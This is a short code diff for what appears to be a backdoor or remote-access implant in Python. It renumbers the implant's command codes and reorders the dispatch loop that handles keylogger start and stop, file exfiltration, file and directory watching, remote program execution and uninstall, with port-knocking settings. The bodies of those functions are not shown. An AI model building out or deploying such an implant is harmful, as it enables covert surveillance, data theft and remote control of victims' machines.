@@ -22,15 +22,17 @@ KNOCK_TIMEOUT_SECONDS = 5.0
 ACK_SOURCE_PORT = 9000
 ACK_DESTINATION_PORT = 54321
 TTL = 64
-CMD_DISCONNECT = 1
-CMD_TRANSFER_FILE = 2
+
+CMD_DISCONNECT = 2
 CMD_UNINSTALL = 3
-CMD_RUN_PROGRAM = 4
-CMD_REQUEST_FILE = 5
-CMD_WATCH_FILE = 6
-CMD_WATCH_DIR = 7
-CMD_RUN_KL = 8
-CMD_STOP_KL = 9
+CMD_RUN_KL = 4
+CMD_STOP_KL = 5
+CMD_TRANSFER_FILE = 6
+CMD_REQUEST_FILE = 7
+CMD_WATCH_FILE = 8
+CMD_WATCH_DIR = 9
+CMD_RUN_PROGRAM = 10
+
 ACK_READY = 0xFFFE
 ACK_META = 0xFFFD
 ACK_CHUNK = 0xFFFC
@@ -1272,16 +1274,19 @@ if __name__ == "__main__":
                 ctx.connected = False
                 ctx.connected_to = None
                 break
-            elif command_code == CMD_TRANSFER_FILE:
-                print("\nReceiving file...")
-                receive_file(ctx)
             elif command_code == CMD_UNINSTALL:
                 print("\nUninstalling...")
                 uninstall(ctx)
                 break
-            elif command_code == CMD_RUN_PROGRAM:
-                print("\nRunning program...")
-                run_program(ctx)
+            elif command_code == CMD_RUN_KL:
+                print("\nStarting key logger...")
+                run_kl(ctx)
+            elif command_code == CMD_STOP_KL:
+                print("\nStopping key logger...")
+                stop_kl(ctx)
+            elif command_code == CMD_TRANSFER_FILE:
+                print("\nReceiving file...")
+                receive_file(ctx)
             elif command_code == CMD_REQUEST_FILE:
                 print("\nSending requested file...")
                 send_file(ctx)
@@ -1291,12 +1296,9 @@ if __name__ == "__main__":
             elif command_code == CMD_WATCH_DIR:
                 print("\nStarting directory watch...")
                 _watch_and_stream(ctx, recursive=True)
-            elif command_code == CMD_RUN_KL:
-                print("\nStarting key logger...")
-                run_kl(ctx)
-            elif command_code == CMD_STOP_KL:
-                print("\nStopping key logger...")
-                stop_kl(ctx)
+            elif command_code == CMD_RUN_PROGRAM:
+                print("\nRunning program...")
+                run_program(ctx)
             else:
                 print(f"Ignoring unknown command code {command_code}.")
 
